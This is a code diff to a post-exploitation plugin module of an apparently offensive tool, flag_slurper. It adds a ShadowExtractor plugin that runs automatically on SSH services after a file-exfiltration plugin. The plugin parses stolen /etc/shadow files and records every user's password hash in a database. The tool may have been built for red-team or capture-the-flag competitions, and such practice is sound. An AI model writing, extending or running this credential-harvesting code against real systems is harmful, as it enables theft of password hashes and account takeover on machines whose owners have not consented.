@@ -16,14 +16,14 @@ import logging
 import os
 from abc import ABC, abstractmethod
 from collections import deque
-from typing import Tuple, Type, Dict, List
+from typing import Tuple, Type, Dict, List, Iterable
 
 import paramiko
 from schema import Schema, Optional
 
 from flag_slurper.autolib import Service
 from .exploit import get_directory, get_file, run_command, run_sudo, expand_wildcard
-from .models import Credential, File
+from .models import Credential, File, ShadowEntry
 
 logger = logging.getLogger(__name__)
 
@@ -101,6 +101,7 @@ class PostPlugin(ABC):
     schema = None
     context_schema = None
     config = None
+    depends_on = []
 
     def configure(self, config: dict) -> dict:
         """
@@ -272,7 +273,7 @@ class SSHFileExfil(PostPlugin):
                 'merge_files': True,
             }
 
-        credentials: Credential = context['credentials']
+        credentials: Iterable[Credential] = context['credentials']
         ssh: paramiko.SSHClient = context['ssh']
 
         def _map_creds(bag):
@@ -344,5 +345,40 @@ class SSHFileExfil(PostPlugin):
         return service.service_port == 22
 
 
+class ShadowExtractor(PostPlugin):
+    """
+    Extract hashes out of collected files.
+
+    This plugin will run automatically for all services using port 22.
+    """
+    name = 'shadow'
+    schema = {}
+    context_schema = {}
+    depends_on = ['ssh_exfil']
+
+    def run(self, service: Service, context: PostContext):
+        super().run(service, context)
+        logger.debug('Running post shadow extractor')
+
+        files = File.select().where(File.service == service, File.path.endswith('/shadow'))
+        for file in files:
+            contents = file.contents.tobytes().decode('utf-8')
+            [self._parse_shadow(line, file, service) for line in contents.split('\n')]
+
+    @staticmethod
+    def _parse_shadow(line: str, file: File, service: Service):
+        (username, hash, *_) = line.split(':')
+        if hash == '*' or hash == '!':
+            logger.debug('skipping user without hash %s', username)
+            return
+
+        logger.info('Found valid hash for %s', username)
+        ShadowEntry.create(source=file, service=service, username=username, hash=hash)
+
+    def predicate(self, service: Service, context: PostContext) -> bool:
+        return service.service_port == 22
+
+
 registry = PluginRegistry()
 registry.register(SSHFileExfil)
+registry.register(ShadowExtractor)
